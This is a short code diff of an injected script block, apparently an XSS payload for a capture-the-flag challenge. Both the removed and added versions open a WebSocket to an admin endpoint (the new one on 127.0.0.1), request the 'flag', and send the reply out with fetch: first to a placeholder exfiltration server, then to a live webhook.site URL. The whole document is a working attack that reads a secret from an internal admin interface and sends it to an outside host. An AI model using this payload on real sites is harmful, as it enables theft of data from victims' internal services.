@@ -1,10 +1,22 @@
 <script>
-    const ws = new WebSocket('ws://65.108.201.109:8080/admin/ws');
-    ws.onopen = () => ws.send('flag');
-    ws.onmessage = (event) => {
-      // Exfiltrate the flag (replace with your server or use alert for testing)
-      fetch('https://your-exfil-server/collect?flag=' + encodeURIComponent(event.data));
-      // For testing, you can use an alert
-      // alert('Flag: ' + event.data);
-    };
+// Use the correct WebSocket URL
+const ws = new WebSocket(`ws://127.0.0.1:8080/admin/ws`);
+ws.onopen = () => ws.send("flag");
+
+// Set up event handlers
+ws.onopen = function() {
+  console.log("Connection established");
+  // Send the command to get the flag
+  ws.send("flag");
+};
+
+ws.onmessage = function(event) {
+  console.log("Received:", event.data);
+  // Exfiltrate the flag
+  fetch('http://webhook.site/7dc602c0-3b28-4688-b3ec-2ff5d970ac9c?flag=' + encodeURIComponent(event.data));
+};
+
+ws.onerror = function(error) {
+  console.error("WebSocket error:", error);
+};
   </script>
